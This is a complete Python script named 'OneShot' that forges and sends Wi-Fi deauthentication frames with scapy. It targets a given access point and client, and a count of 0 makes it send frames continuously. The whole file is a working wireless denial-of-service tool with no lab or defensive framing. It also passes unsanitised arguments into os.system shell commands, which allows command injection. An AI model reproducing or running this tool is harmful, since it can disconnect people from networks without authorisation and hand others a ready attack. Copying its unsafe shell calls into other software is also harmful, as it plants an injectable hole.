import argparse
import scapy.layers.dot11
from scapy.all import *
import os

parser = argparse.ArgumentParser(
    prog='OneShot',
    description='A Python based deauthentication constructor that allows full control of frames sent and reason why. '
                'Behaves similar to aireplay-ng but allows a user to send 1 deauthentication frame as opposed to 64 '
                'per count of 1.'
)
parser.add_argument('-0', '--count',
                    type=int,
                    default=1,
                    help='Sets the number of frames to be sent. A value of 0 will make oneshot continuously send'
                         'deauthentication frames. Default value is 1')
parser.add_argument('-a', '--bssid',
                    required=True,
                    help='Sets the target BSSID of the deauthentication frame. Required')
parser.add_argument('-c', '--client',
                    required=True,
                    help='Sets the target client of the deauthentication frame. Required')
parser.add_argument('-r', '--reason',
                    type=int,
                    default=7,
                    help='Sets the reason code of the deauthentication frame. Default value is 7: '
                         'Class 3 frame received from nonassociated STA')
parser.add_argument('--channel',
                    type=int,
                    required=True,
                    help='Sets the channel for the deauthentication frame to be sent on. Required')
parser.add_argument('interface',
                    help='Sets the interface to send the deauthentication frame. Interface will be put in monitor mode.'
                         ' Required')
args = parser.parse_args()

ap = args.bssid
channel = args.channel
client = args.client
reason = args.reason
count_bssid = args.count
count_client = args.count
interface = args.interface

os.system(f'ifconfig {interface} down')
os.system(f'iwconfig {interface} mode monitor')
os.system(f'ifconfig {interface} up')
os.system(f'iwconfig {interface} channel {channel}')

if args.count == 0:
    count_bssid = -1
    count_client = 0

def deauth():
    dot11_bssid = scapy.layers.dot11.Dot11(
        type=0,
        subtype=12,
        addr1=client,
        addr2=ap,
        addr3=ap,
    )
    dot11_client = scapy.layers.dot11.Dot11(
        type=0,
        subtype=12,
        addr1=ap,
        addr2=client,
        addr3=ap,
    )
    deauth_frame = scapy.layers.dot11.Dot11Deauth(reason=reason)
    frame_bssid = scapy.layers.dot11.RadioTap()/dot11_bssid/deauth_frame
    frame_client = scapy.layers.dot11.RadioTap()/dot11_client/deauth_frame
    sendp(frame_bssid, iface=interface, count=count_bssid, inter=0.100)
    print(f'Sending Deauthentication to {client}')
    sendp(frame_client, iface=interface, count=count_client, inter=0.100)
    print(f'Sending Deauthentication to {ap}')

deauth()